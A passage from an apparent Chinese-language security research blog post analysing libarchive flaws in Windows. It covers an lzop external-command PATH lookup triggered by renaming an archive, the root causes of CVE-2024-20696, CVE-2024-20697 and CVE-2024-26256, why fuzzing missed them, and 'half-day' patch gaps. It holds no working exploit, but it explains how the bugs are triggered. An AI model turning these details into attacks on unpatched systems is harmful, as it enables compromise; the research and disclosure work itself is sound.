&lt;p&gt;如果 decompile Windows 中對應的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archiveint.dll&lt;/code&gt;，可以發現某些格式確實會呼叫外部的執行檔案，以 lzop 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop_bidder_init&lt;/code&gt; 為例：
&lt;img src=&quot;/assets/img/blog/20250212/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因此，根據「libarchive 會自行根據檔案內容決定用什麼格式進行解壓縮」的事實，我們只要將一個 lzop 格式的壓縮檔案的副檔名改為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rar&lt;/code&gt;，對其點兩下開啟，就能觸發對應的 lzop 解壓縮函式 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop_bidder_init&lt;/code&gt;：
&lt;img src=&quot;/assets/img/blog/20250212/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接著就會看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archiveint.dll&lt;/code&gt; 嘗試使用外部指令 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop -d&lt;/code&gt; 來進行解壓縮。結果就是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt; 會去 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt; 中尋找有沒有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop.exe&lt;/code&gt; 存在，並嘗試執行：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;rces-reported-by-morse-cve-2024-20696-and-cve-2024-20697&quot;&gt;RCEs Reported by MORSE: CVE-2024-20696 and CVE-2024-20697&lt;/h3&gt;

&lt;p&gt;到目前為止，不難發現 libarchive 帶來許多攻擊面。實際上，Windwos 也在 2024 的 1 月修復了微軟研究團隊 Microsoft Offensive Research Security Engineering (MORSE) team 回報的兩個漏洞，分別是與 &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20696&quot;&gt;CVE-2024-20696&lt;/a&gt; 與 &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20697&quot;&gt;CVE-2024-20697&lt;/a&gt; 兩個 RCE 漏洞。&lt;/p&gt;

&lt;h4 id=&quot;cve-2024-20696-oob-write-in-copy_from_lzss_window_to_unp&quot;&gt;CVE-2024-20696: OOB Write In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window_to_unp&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;CVE-2024-20696 發生在 libarchive 解壓縮 RAR 格式的檔案時候。在解壓縮的過程中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window_to_unp&lt;/code&gt; 的第四個參數 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; 是根據 lzss 解壓縮後的狀態計算出的 copy length。由於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window_to_unp&lt;/code&gt; 在這裡錯誤地將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; 定義為 int，導致攻擊者可以透過構造 lzss 將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; 變為負數，從而繞過檢查造成越界寫的漏洞。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;cve-2024-20697-oob-write-in-execute_filter_e8&quot;&gt;CVE-2024-20697: OOB Write In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;CVE-2024-20697 也發生在 libarchive 解壓縮 RAR 格式的檔案時候。如果 RAR 檔案有使用到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter e8&lt;/code&gt; 時（RAR 檔案格式的 filter，與 libarchive 的 filter 無關），解壓縮便會觸發 libarchive 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt;。
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt; 在檢查 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; 時雖然是檢查 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; 必須大於等於 4，但是在迴圈計算卻使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length - 5&lt;/code&gt;，所以當 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;legnth&lt;/code&gt; 為 4 時，迴圈便會執行 0x100000000 次，導致越界寫。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;fuzzing-why-oss-fuzz-never-found-hese&quot;&gt;Fuzzing: Why OSS-Fuzz Never Found hese?&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在復現這兩個 CVE 時，由於需要構造 RAR，製作起來較耗費時間，例如在 CVE-2024-20696 中需要構造 lzss 使得 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; 的計算結果為負數，而在 CVE-2024-20697 中我們需要放入 filter e8，在構造上較為麻煩。因此我們透過 AFL++ ，將合法的 RAR 以及有使用 filter e8 的 RAR 作為 seed 進行 Fuzzing。意外的是，僅在 56 秒之內我們就找到了一個 CVE-2024-20697 的 crash：
&lt;img src=&quot;/assets/img/blog/20250212/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;很快就能找到 crash 當然是好事，但這裡有一個大問題：OSS-Fuzz 至少從 2016 年開始就 24 小時全年無休的對 libarchive 進行 Fuzzing，56 秒就能夠找到 crash 的漏洞怎麼可能還沒有被發現呢？
&lt;img src=&quot;/assets/img/blog/20250212/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;從 OSS-Fuzz 對 libarchive 的總結可以看到，六月時，OSS-Fuzz 對 libarchive 進行的 Fuzzing 的覆蓋率僅有 15.03%:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而且看起來已經持續了很長一段時間：
&lt;img src=&quot;/assets/img/blog/20250212/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;從檔案來看，可以發現有些 format 基本上沒有被測試過，例如 RAR 的覆蓋率僅有 4.07%
&lt;img src=&quot;/assets/img/blog/20250212/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;謎底揭曉&quot;&gt;謎底揭曉&lt;/h4&gt;

&lt;p&gt;在我們準備演講的同時，libarchive 的 GitHub 上有個關於 OSS-Fuzz 的 commit。他是這麼說的： libarchive 在提交給 OSS-Fuzz 執行的設定中，呼叫 CMake 時雖然有啟用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DONT_FAIL_ON_CRC_ERROR&lt;/code&gt;，但卻從來都沒有在 CMake 中好好定義這個 option！
&lt;img src=&quot;/assets/img/blog/20250212/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;本來，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DONT_FAIL_ON_CRC_ERROR&lt;/code&gt; 這個 flag 會讓 libarchive 在 CRC 不符的情況下也繼續處理該檔案。而我們都知道 Fuzzer 一直都不擅於構造出正確的 checksum。也就是說 OSS-Fuzz 覆蓋率長期低下的原因是因為 Fuzzer 無法產生出合法的 CRC 來通過檢查，導致 Fuzzer 永遠卡在 libarchive 檢查 CRC 的邏輯之中。&lt;/p&gt;

&lt;p&gt;修正之後可以看到 OSS-Fuzz 對 libarchive 的覆蓋率有飛躍性的提升，從 15.03% 提升到 63.10%。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;從個別檔案的覆蓋率來看也可以發現大部分的檔案格式覆蓋率大幅提升：
&lt;img src=&quot;/assets/img/blog/20250212/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;keep-fuzzing&quot;&gt;Keep Fuzzing&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在進行 code review 的同時我們讓 AFL++ 繼續為我們勞動，除了我們接下來即將提到的 RCE 漏洞之外，我們還透過 Fuzzing 找到了 CVE-2024-48957、CVE-2024-48958 兩個越界讀漏洞。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-26256-libarchive-remote-code-execution-vulnerability&quot;&gt;CVE-2024-26256: Libarchive Remote Code Execution Vulnerability&lt;/h3&gt;

&lt;p&gt;在分析了微軟自行回報的 CVE-2024-20696 以及 CVE-2024-20697 之後，我們可以發現這兩個漏洞皆出現在解析 RAR 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_rar.c&lt;/code&gt; 中，而且都是近三年加入的 feature。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以我們決定從 RAR 開始進行檢查，看看是否還能發現其他漏洞。而我們第一個想知道的是，CVE-2024-20697 成因中的「&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_e8&lt;/code&gt;」是什麼? Commit message 的「support rar filters」的「filters」是什麼？&lt;/p&gt;

&lt;h4 id=&quot;rar-中的-vm&quot;&gt;RAR 中的 VM&lt;/h4&gt;

&lt;p&gt;要知道 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_e8&lt;/code&gt; 是什麼，我們首先得先知道：其實 RAR 中有一個 VM！RAR 實際上包含了一個 register-based VM，這個 VM 可以執行自訂的小程式來增加 RAR 的壓縮比。具體方式就是在建立 RAR 檔案時，可以在裡面放入客製的「filter」小程式，所以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_e8&lt;/code&gt; 實際上就是這麼一個程式，他是專門為了 Intel 的 binary 所產生的一個增加壓縮比的程式，而名稱中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e8&lt;/code&gt; 源自於 Intel 指令集中 near call 的 opcode：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是 call instruction 與改善壓縮比之間的關係是什麼？以下面的程式為例，假設在程式中，有兩個位置呼叫了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;funcA&lt;/code&gt;，程式會產生兩個 call 指令，在這裏分別是位置 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; 與位置 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt;。在 Intel 的機器語言中，我們可以看到 near call 是以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xe8&lt;/code&gt; 開頭，後面跟著四個 bytes，也就是手冊中說的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt;。&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; 即是呼叫的目標與下一條指令的相對位置，以第一條 call 指令來看，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; 是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1b&lt;/code&gt;，即是呼叫的目標（0x20），減去下一條指令（0+5）所得出的相對位置 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1b&lt;/code&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這兩條指令雖然皆是呼叫 funcA，但由於內容不同，在進行壓縮時表現就較差。那既然 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; 是可以簡單計算來的，那只要先把 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; 的位置都先替換成目標的位置，機器語言會就長得一樣，壓縮比就能夠進一步上升！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在解壓縮時，只要將把被替代掉的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; 透過計算還原回來就好了，這一步便是使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e8 filter&lt;/code&gt; 將之復原。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而 libarchive 的實作為了簡化，並沒有實作整個 VM，而是單純將 filter 程式的內容進行 crc32 運算，並將結果作為 fingerprint，直接執行對應的 filter，參考 &lt;a href=&quot;https://github.com/libarchive/libarchive/blob/42565b88b5cc7441239269902a9d1735fd9ca0e2/libarchive/archive_read_support_format_rar.c#L3826&quot;&gt;libarchive&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;execute_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;archive_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rar_filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rar_virtual_machine&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1D0E06077D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x35AD576887&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_e8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x393CD7E57E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_e8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x951C2C5DC8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_rgb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xD8BC85E701&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_audio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;archive_set_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ARCHIVE_ERRNO_FILE_FORMAT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;No support for RAR VM program filter&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在 RAR v5 之後，filter 在 RAR 中變成了 enum 類型，只能選用預先定義好的 filter，可以參考 &lt;a href=&quot;https://www.rarlab.com/rar_add.htm&quot;&gt;UnRAR source&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FilterType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// These values must not be changed, because we use them directly&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// in RAR5 compression and decompression code.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;FILTER_DELTA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_E8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_E8E9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_ARM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
  &lt;span class=&quot;n&quot;&gt;FILTER_AUDIO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_RGB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_ITANIUM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
  
  &lt;span class=&quot;c1&quot;&gt;// These values can be changed.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;FILTER_LONGRANGE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILTER_EXHAUSTIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILTER_NONE&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;code-review&quot;&gt;Code Review&lt;/h4&gt;

&lt;p&gt;filter 的行為看起來很有趣，而微軟所發現的漏洞也位於 filter 之內，所以我們嘗試對 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_rar.c&lt;/code&gt; 進行 code reveiw。&lt;/p&gt;

&lt;p&gt;經過一段時間我們也在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt; 找到了一個 heap buffer overflow 的漏洞，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt; 的參數 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; 沒有任何檢查就直接使用於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt;，而 buffer 的大小僅為 0x40004 bytes：
&lt;img src=&quot;/assets/img/blog/20250212/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;從呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt; 的地方來看，可以發現這是用來將資料複製進 VM 記憶體的函式：
&lt;img src=&quot;/assets/img/blog/20250212/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;漏洞成因看起來非常簡單，但較麻煩的是需要構造 libarchive 願意執行的 filter，並提供正確長度的資料。這些資訊並不直接存在於 RAR 中最表層的欄位，而是存在於 data 之中。並且，data 經過 Huffman coding 編碼，因此後面所提供的資訊也必須先進行一次編碼，而且不是 byte by byte 而是 7-bit by 7-bit。由於這部分不是本文的重點，我們不在這裡展開來講，我們鼓勵讀者進行復現。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這個漏洞已經被微軟修復：&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26256&quot;&gt;CVE-2024-26256&lt;/a&gt;。而這個漏洞沒有被 Fuzzer 發現的原因也很簡單，雖然 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter-&amp;gt;blocklength&lt;/code&gt; 只要夠大就能夠觸發越界寫，但需要提供與 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter-&amp;gt;blocklength&lt;/code&gt; 一樣長的 data 才能通過檢查，而在 coverage 相同的情況下，Fuzzer 通常傾向於將檔案縮小。&lt;/p&gt;

&lt;h3 id=&quot;half-day長得像-0-day-的-1-day&quot;&gt;Half-day：長得像 0-day 的 1-day&lt;/h3&gt;

&lt;p&gt;當我們稍早提到「微軟研究團隊 Microsoft Offensive Research Security Engineering (MORSE) team 回報的兩個漏洞」時。我們提到在構造 PoC 上較困難，或許有人馬上就想到了：「為什麼不去 libarchive 的 GitHub repository 找 test 或是說明呢？」對，我們找過了，沒有。&lt;/p&gt;

&lt;p&gt;因為當時的 libarchive 甚至還沒有被 patch，或是說，可能甚至沒有人知道漏洞已經存在！微軟在一月時，就已經修復 Windows fork 出去的 libarchive：
&lt;img src=&quot;/assets/img/blog/20250212/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在研究結束之後，我們才在 libarchive 的 GitHub repository 上看到對應的兩個 patch ，分別是五月跟四月才被 merge 進去：
&lt;img src=&quot;/assets/img/blog/20250212/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那豈不是只要長期有關注 Windows patch 的人馬上就會發現 libarchive upstream 存在兩個尚未修補的漏洞嗎？它們對於 Windows forked 版本的 libarchive 來說是 1-day，因為漏洞已被發現並且修補了；對 libarchive upstream 來說是 0-day，因為尚未有修補存在且維護者甚至可能不知情！我們接下來會將這種情況稱為「0.5-day」或是「Half-day」。&lt;/p&gt;

